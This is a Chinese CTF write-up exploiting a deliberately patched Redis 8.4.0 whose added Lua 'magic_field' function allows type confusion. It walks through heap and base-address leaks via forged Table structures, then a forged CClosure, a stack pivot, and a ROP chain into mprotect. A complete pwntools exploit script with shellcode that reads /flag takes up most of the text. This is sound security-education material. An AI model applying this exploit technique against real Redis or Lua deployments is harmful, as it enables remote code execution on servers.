## redis

为了调试方便可以先编译一个没去符号的版本（其实给的版本也没去，不过可以源码调试
```shell
wget https://download.redis.io/releases/redis-8.4.0.tar.gz
tar -xzf redis-8.4.0.tar.gz 
cd redis-8.4.0 
cp ../magic_field.patch ./
patch -p1 < magic_field.patch
make noopt -j8
```

### vuln

先认识一下lua5.1(redis内置版本)基本数据结构

由最基础的,value储存具体值，tt用于区分类型

```c
#define TValuefields	Value value; int tt

typedef struct lua_TValue {
  TValuefields;
} TValue;
```

tt由以下类型

```c
// lua.h
#define LUA_TNONE		(-1)
#define LUA_TNIL		0
#define LUA_TBOOLEAN		1
#define LUA_TLIGHTUSERDATA	2
#define LUA_TNUMBER		3
#define LUA_TSTRING		4
#define LUA_TTABLE		5
#define LUA_TFUNCTION		6
#define LUA_TUSERDATA		7
#define LUA_TTHREAD		8
```

然后value进一步细分包括布尔以及数值，其中`gc`可以理解为是需要一定或未知空间大小的对象，其需要malloc的，同时定义成一种类型方便内置的GC机制回收垃圾

```c
/*
** Union of all Lua values
*/
typedef union {
  GCObject *gc;
  void *p;
  lua_Number n; // double
  int b;
} Value;
```

gc又可以进一步细分，包括字符串，函数，表

```c
//tt，即该GC对象的具体类型
//next，指向GCObject的指针，用于GC算法内部实现链表
//marked，用于GC算法内部实现
#define CommonHeader	GCObject *next; lu_byte tt; lu_byte marked

typedef struct GCheader {
  CommonHeader;
} GCheader;

/*
** Union of all collectable objects
*/
union GCObject {
    GCheader gch;
    union TString ts;// 字符串
    union Udata u;
    union Closure cl;// 函数
    struct Table h;// 表
    struct Proto p;
    struct UpVal uv;
    struct lua_State th;  /* thread */
};
```

patch文件的魔改，可以让用户任意修改表内数组成员的`TValue->tt`的值在0~8内，可以认为是一个强制的类型混淆

### leak

第一步就是泄漏堆的地址以及程序基地址，本质是没必要考虑libc地址的，因为redis本体足够大让我们找到可用的gadget用于ROP，且自带`mprotect`

先看`TString`本体，先是记住其字符串内容是紧跟结构体之后的

``` c
00000000 struct TString::$334A375AC6443D5F2F52B9E8A07B799F // sizeof=0x18
00000000 {                                       // XREF: TString/r
00000000     GCObject *next;
00000008     lu_byte tt;
00000009     lu_byte marked;
0000000A     lu_byte reserved;
0000000B     // padding byte
0000000C     unsigned int hash;
00000010     size_t len;
00000018 };
```

如果我创建一个`TString`，则其对应的`TValue`肯定是指向堆的，因此通过混淆为`number`值，即可泄漏`TString`的地址，不过需要注意不能直接返回值，`redis`没法返回浮点数会被转换成整数，可以选择先将其`tostring`后返回处理

```lua
local tb = {}
tb[1] = tb
for i = 1, 6 do
    table.magic_field(tb, 1)
end
return tostring(tb[1])
```

由于泄漏的是浮点数，因此返回的浮点数可以通过struct库处理变成我们需要泄漏的地址

```python
def double2int64(num):
    p = struct.pack("<d", num)
    up = struct.unpack("Q", p)
    return up[0]
```



接下来便要考虑泄漏程序基地址，先看看`Table`即表的本体

```c
00000000 struct __attribute__((aligned(8))) Table // sizeof=0x48
00000000 {                                       // XREF: GCObject/r
00000000     GCObject *next;
00000008     lu_byte tt;
00000009     lu_byte marked;
0000000A     lu_byte flags;
0000000B     // padding byte
0000000C     int readonly;
00000010     lu_byte lsizenode;
00000011     // padding byte
00000012     // padding byte
00000013     // padding byte
00000014     // padding byte
00000015     // padding byte
00000016     // padding byte
00000017     // padding byte
00000018     Table *metatable;
00000020     TValue *array;
00000028     Node *node;
00000030     Node *lastfree;
00000038     GCObject *gclist;
00000040     int sizearray;
00000044     // padding byte
00000045     // padding byte
00000046     // padding byte
00000047     // padding byte
00000048 };
```

调试的过程中，不难发现Table底层结构体其表未初始的状态下其`node`和`lastfree`成员里保存的是在程序地址段中的一个叫`dummy`的东西，通过泄漏其就能泄漏程序基地址。

接下来就是可以选择通过`TString`来伪造一个`table`让这个伪造的`table`的数组指向即`array`指向保存的`node`地址，接下来读取这个伪造的`table`即可获取

`TString`伪造也比较简单就是在一个字符串内写入伪造的`table`，然后将其转换成num，num再加上0x18(这个大小是`TString`结构体大小，加上后便指向写入的内容)，处理后的`num`再转换为`table`即可

```lua
local tb = {{}}
tb[1] =  {craft_Table(array_ptr=tb_Table+0x28, sizearray=2)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
```

```lua
local tb = {{}}
tb[1] = {int642double(fake_Table)}
for i = 1, 2 do
    table.magic_field(tb, 1)
end

for i = 1, 3 do
    table.magic_field(tb[1], 1)
end
local a = tostring(tb[1][1])
return a
```

### hijack

接下来考虑劫持程序执行流，先认识一个结构体，可以认为该结构体是属于function类型的，不过其调用的是内置的c函数，`lua_CFunction f`便是保存c函数地址，因此如果能伪造一个`CClosure`结构体，将f指向自己想执行的gadget便能达到劫持的目的了

```c
00000000 struct CClosure // sizeof=0x38
00000000 {                                       // XREF: Closure/r
00000000     GCObject *next;
00000008     lu_byte tt;
00000009     lu_byte marked;
0000000A     lu_byte isC;
0000000B     lu_byte nupvalues;
0000000C     // padding byte
0000000D     // padding byte
0000000E     // padding byte
0000000F     // padding byte
00000010     GCObject *gclist;
00000018     Table *env;
00000020     lua_CFunction f;
00000028     TValue upvalue[1];
00000038 };
```

伪造的方式和伪造table方式同理

可以发现其执行f函数时其rax是指向伪造`CClosure`结构体的开头，同时`CClosure->next`为我们可控，因此可以利用以下gadget，达到栈迁移

```c
0x000000000021cf69, # mov rax, qword ptr [rax]; call qword ptr [rax + 0x20];
0x00000000001420ad, # push rax; add al, 0; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret;
```

伪造之前可以提前布局好的`ROP`链，程序自带`mprotect`，同时可以选择提前布局`shellcode`

基本流程      `泄漏基地址`->`布局shellcode并获取其地址`->`布局ROP链并获取其地址`->`伪造CClosure并获取其地址`->

`最后执行伪造的函数`

EXP

> 拿flag是通过在redis连接之前先用pwntools连接占用服务的fd-12的socket，后续flag直接写入该socket
>
> 为了方便理解以及写代码简单，则不是写一个完整lua代码，将上面全部过程搞定，而是分布完成，因此整个过程中会有一些布局会被释放后被修改，所以成功率较低

```python
from redis import Redis
import redis 
import sys
from pwn import *
import threading
dummy_node_offset = 0x32a160
tb_Table = 0
fake_Table = 0
code_base = 0
fake_CClosure = 0
shellcode_addr = 0
elf = ELF("redis-server")

def int642double(num):
    p = struct.pack("Q", num)
    up = struct.unpack("<d", p)
    return up[0]

def double2int64(num):
    p = struct.pack("<d", num)
    up = struct.unpack("Q", p)
    return up[0]

def bytes_to_lua_stringchar(data):
    if not data:
        return "string.char()"
    hex_value = ', '.join(f'0x{byte:02X}' for byte in data)
    return f'string.char({hex_value})'

def craft_Table( next_ptr=0, tt=0x05, marked=0, flags=0, readonly=0, lsizenode=0, metatable_ptr=0, array_ptr=0, node_ptr=0, lastfree_ptr=0, gclist_ptr=0, sizearray=0):
    """
    struct Table {
        GCObject *next;
        lu_byte tt;
        lu_byte marked;
        lu_byte flags;
        int readonly;
        lu_byte lsizenode;
        struct Table *metatable;
        TValue *array;
        Node *node;
        Node *lastfree;
        GCObject *gclist;
        int sizearray;
    }
    """
    fmt = "@QBBBiBQQQQQi"
    data = struct.pack(fmt, next_ptr, tt, marked, flags, readonly, lsizenode,
                metatable_ptr, array_ptr, node_ptr, lastfree_ptr, 
                gclist_ptr, sizearray)
    return data

def craft_CClosure(next_addr, func_addr):
    """
    struct CClosure {
        GCObject *next;
        lu_byte tt;
        lu_byte marked;
        lu_byte isC;
        lu_byte nupvalues;
        GCObject *gclist;
        Table *env;
        lua_CFunction f;
        Tvalue upvalue[1];
    }
    """
    fmt = "@QBBBBQQQQi"
    data = struct.pack(fmt, next_addr, 6, 0, 1, 0, 0, 0, func_addr, 0, 0)
    return data


def clean(r):
    # This reset the jemalloc tcache being used, which is very useful for consistent bin addressing.
    r.script_flush('SYNC')
    print('[+] Clean all complate')

def craft_leak1():
    script = """
local tb = {}
tb[1] = tb
for i = 1, 6 do
    table.magic_field(tb, 1)
end
return tostring(tb[1])
    """
    return script

def craft_leak2():
    payload = craft_Table(array_ptr=tb_Table+0x28, sizearray=2)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_leak3():
    script = f"""
local tb = {{}}
tb[1] = {int642double(fake_Table)}
for i = 1, 2 do
    table.magic_field(tb, 1)
end

for i = 1, 3 do
    table.magic_field(tb[1], 1)
end
local a = tostring(tb[1][1])
return a
    """
    return script

gad = [
    0x000000000021cf69, # mov rax, qword ptr [rax]; call qword ptr [rax + 0x20];
    0x00000000001420ad, # push rax; add al, 0; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret;
    0x0000000000084cd2, # pop rdi; ret;
    0x0000000000088de1, # pop rsi; ret;
    0x00000000000cd5df, # pop rdx; ret;
    elf.plt["mprotect"]
]
def craft_hijack0():
    payload = b""
    payload+= p64(gad[2]) + p64(0)
    payload+= p64(gad[2]) + p64(gad[1])
    payload+= p64(gad[2]) + p64(shellcode_addr&(~0xfff))
    payload+= p64(gad[3]) + p64(0x2000)
    payload+= p64(gad[4]) + p64(7)
    payload+= p64(gad[5]) + p64(shellcode_addr)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack1():
    payload = craft_CClosure(fake_stack-8, gad[0]) + p32(0)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack2():
    context.arch = "amd64"
    sc = shellcraft.open('/flag')
    sc+= shellcraft.read('rax', 'rsp', 0x100)
    sc+= shellcraft.write(12, 'rsp', 'rax')
    payload = asm(sc)
    script = f"""
local tb = {{}}
tb[1] = {bytes_to_lua_stringchar(payload)}
for i = 1, 7 do
    table.magic_field(tb, 1)
end
local a = tostring(tb[1])
return a
    """
    return script

def craft_hijack3():
    script = f"""
local tb = {{}}
tb[1] = {int642double(fake_CClosure)}
for i = 1, 3 do
    table.magic_field(tb, 1)
end
tb[1]()
    """
    return script

def get_flag(host, port):
    p = remote(host, port)
    print(p.recvline())

def main():
    global tb_Table 
    global fake_Table
    global code_base
    global fake_CClosure
    global gad
    global shellcode_addr
    global fake_stack
    host = "127.0.0.1"
    port = 6379
    th = threading.Thread(target=get_flag, args=(host, port, ))
    th.start()
    sleep(1)

    r = Redis(host=host, port=port, socket_timeout=2, socket_connect_timeout=2)
    flag = 0
    try:
        clean(r)
        script = craft_leak1()
        leak = r.eval(script, 0)
        leak = float(leak)
        tb_Table = double2int64(leak)&(~0xf)
        print(f"[+] tb_Table: {hex(tb_Table)}")

        script = craft_leak2()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_Table = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_Table: {hex(fake_Table)}")

        script = craft_leak3()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        code_base = (double2int64(leak)&(~0xf)) - dummy_node_offset
        print(f"[+] code_base: {hex(code_base)}")

        for i in range(len(gad)):
            gad[i]+= code_base

        script = craft_hijack2()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        shellcode_addr = (double2int64(leak)&(~0xf)) + 0x28
        print(f"[+] shellcode_addr: {hex(shellcode_addr)}")

        script = craft_hijack0()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_stack = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_stack: {hex(fake_stack)}")

        script = craft_hijack1()
        leak = r.eval(script, 0).ljust(8, b'\x00')
        leak = float(leak)
        fake_CClosure = (double2int64(leak)&(~0xf)) + 0x18
        print(f"[+] fake_CClosure: {hex(fake_CClosure)}")
        
        
        script = craft_hijack3()
        leak = r.eval(script, 0)
    except Exception as e:
        print("[!] over")
    
if __name__ == "__main__":
    main()

```



